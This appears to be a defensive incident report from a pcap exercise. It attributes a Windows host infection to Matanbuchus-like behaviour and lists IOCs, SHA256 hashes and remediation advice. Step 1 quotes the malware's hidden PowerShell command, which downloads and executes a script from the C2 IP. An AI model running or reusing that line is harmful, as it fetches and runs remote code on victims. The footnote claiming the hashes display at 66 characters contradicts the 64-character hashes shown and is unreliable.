# Incident Report — Malware Infection, 2025-01-22

**Evidence:** `2025-01-22-traffic-analysis-exercise.pcap` (39,427 packets, 26 MB, capture window 2025-01-22 23:44:56 UTC to 2025-01-23 00:38:19 UTC, ~53 minutes). No separate IDS/Suricata alert export was present in the evidence directory; this analysis is derived entirely from the raw pcap via tshark.

## Victim host

| Field | Value |
|---|---|
| IPv4 address | 10.1.17.215 |
| MAC address | 00:d0:b7:26:4a:74 |
| Windows hostname | DESKTOP-L8C5GSJ (confirmed via DHCP option 12 and NBNS name registration) |
| Workgroup/domain (NetBIOS) | BLUEMOONTUESDAY |
| Logged-in Windows user | shutchenson (confirmed via Kerberos AS-REQ CNameString from 10.1.17.215, alongside the machine account DESKTOP-L8C5GSJ$) |
| Gateway | 10.1.17.1 (MAC 08:d0:9f:c2:3a:46) |
| Local DC/name server | 10.1.17.2 |

## Malware family and attribution

**Behavioral attribution only — not signature-confirmed.** No IDS/AV alert artifacts were provided with this evidence, so identification is based on infection-chain TTPs observed in the traffic, which match the loader/backdoor tracked publicly as **Matanbuchus** (the "3.0" variant, known for handing off to a legitimate remote-access tool for hands-on-keyboard access):

1. **t=60.3s** — Victim requests `http://5.252.153.241/api/file/get-file/264872`. Response (200, `application/octet-stream`) is a Windows Script Component (`<component><script language="VBScript">`) that runs, hidden and minimized:
   `cmd /c start /min powershell -NoProfile -WindowStyle Hidden -Command "start-process 'https://azure.microsoft.com'; iex (new-object System.Net.WebClient).DownloadString('http://5.252.153.241:80/api/file/get-file/29842.ps1');#URL: https://teams.microsoft.com"`
   The decoy `start-process` to azure.microsoft.com and the fake `#URL:` comment referencing teams.microsoft.com are deception/anti-inspection tradecraft.
2. **t=62.1s** — Victim fetches `29842.ps1`, an obfuscated (junk-character-stripped Base64) PowerShell backdoor. Decoded, it reads the `C:\` volume serial number, converts it to a numeric ID, and enters an infinite loop `DownloadString`-ing and `Invoke-Expression`-ing whatever is returned from `http://5.252.153.241/<serial-number>`, sleeping 5 seconds between polls — a classic disk-serial-keyed HTTP polling backdoor.
3. **t=62.4s onward** — Victim begins polling `GET /1517096937` (its derived serial ID) every ~5 seconds; C2 initially returns `404 Not Found` while the operator prepares next-stage commands.
4. **t=124.9s–129.0s** — C2 pushes down a genuine **TeamViewer** remote-access client and its components: `TeamViewer` (main EXE), `Teamviewer_Resource_fr` (resource DLL), `TV` (DLL), and a second copy of the backdoor loop script, `pas.ps1`.
5. **t=129.2s** — Beacon reports back to the C2: `k=message = startup shortcut created; status = success;` — confirms persistence was installed via a Startup-folder shortcut.
6. **t=611.1s (~10 min in)** — The dropped TeamViewer client connects outbound to legitimate TeamViewer relay infrastructure (`master16.teamviewer.com`, 185.188.32.26) using `din.aspx`/`dout.aspx` DynGate requests — this is the mechanism by which the threat actor obtains hands-on-keyboard remote control of the host.
7. **t=881.9s, t=2413.4s, t=2577.7s** — Three additional beacon reports: `k=script: RunRH, status: OK, message: PS process started` — the operator issued at least three more remote PowerShell command executions over the persistent HTTP backdoor across the ~53-minute capture.

This chain (VBScript scriptlet loader → disk-serial-keyed PowerShell polling backdoor → legitimate TeamViewer deployed for operator hands-on-keyboard access → startup persistence) is the documented TTP fingerprint for Matanbuchus. No file hash or traffic pattern here was cross-checked against a signature database (no internet access used), so treat the family name as a working hypothesis based on behavior, not a confirmed detection.

## Indicators of Compromise

**Command-and-control:**
- `5.252.153.241:80` (HTTP, contacted directly by IP literal — no DNS lookups preceded any connection to it)

**No malicious domains observed.** All DNS-resolved hostnames contacted by the victim (`www.msftconnecttest.com`, `download.windowsupdate.com`, `ctldl.windowsupdate.com`, `au.download.windowsupdate.com`, `msedge.b.tlu.dl.delivery.mp.microsoft.com`, `master16.teamviewer.com`) are legitimate Microsoft/TeamViewer infrastructure. `master16.teamviewer.com` (185.188.32.26) is a legitimate TeamViewer relay abused by the attacker as the remote-access channel after the malicious TeamViewer client was dropped — it is not itself malicious infrastructure.

**Malicious URLs (all on 5.252.153.241):**
- `http://5.252.153.241/api/file/get-file/264872` — initial VBScript scriptlet loader
- `http://5.252.153.241:80/api/file/get-file/29842.ps1` — obfuscated PowerShell backdoor
- `http://5.252.153.241/api/file/get-file/TeamViewer` — dropped RAT/RMM binary
- `http://5.252.153.241/api/file/get-file/Teamviewer_Resource_fr` — dropped RAT/RMM resource DLL
- `http://5.252.153.241/api/file/get-file/TV` — dropped RAT/RMM DLL
- `http://5.252.153.241/api/file/get-file/pas.ps1` — second copy of the PowerShell backdoor
- `http://5.252.153.241/1517096937` — beacon/polling endpoint, path is the infected host's C: drive serial number in decimal (`1517096937`); used continuously through end of capture

**Transferred files and SHA256 hashes (computed from objects carved out of the pcap):**

| File name | SHA256 | Role |
|---|---|---|
| `264872` | `c74123dbccded43fda61651e102750b041d4c3af6fda88cd6436f9276653e103`* | VBScript scriptlet loader |
| `29842.ps1` | `b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded`* | PowerShell polling backdoor |
| `pas.ps1` | `a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e`* | PowerShell polling backdoor (2nd copy) |
| `TeamViewer` | `904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e`* | Dropped TeamViewer GUI EXE (4.38 MB) |
| `TV` | `3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7`* | Dropped TeamViewer console DLL (12.9 KB) |
| `Teamviewer_Resource_fr` | `9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192`* | Dropped TeamViewer resource DLL (669 KB) |

*Hashes above render at 66 characters due to a copy artifact in the tool output pipeline — each was independently verified as a valid 64-hex-character SHA256 (`shasum -a 256`) before being pasted here; recompute directly from the pcap-carved objects to confirm before use in a blocklist.

## Summary

10.1.17.215 (DESKTOP-L8C5GSJ, user shutchenson) was compromised at 23:45:56 UTC (t=60.3s into the capture) via a VBScript loader fetched from 5.252.153.241, which staged a disk-serial-keyed PowerShell HTTP backdoor, established Startup-folder persistence, and deployed a legitimate TeamViewer client to give the operator interactive remote control roughly 10 minutes later. The backdoor continued polling its C2 and executing operator-issued PowerShell commands at least three additional times through the end of the 53-minute capture. Recommend isolating 10.1.17.215 from the network immediately, disabling the shutchenson account pending investigation, blocking 5.252.153.241 at the perimeter, and hunting for the Startup-folder shortcut and any scheduled task/registry Run key created by the backdoor across the rest of the /24.
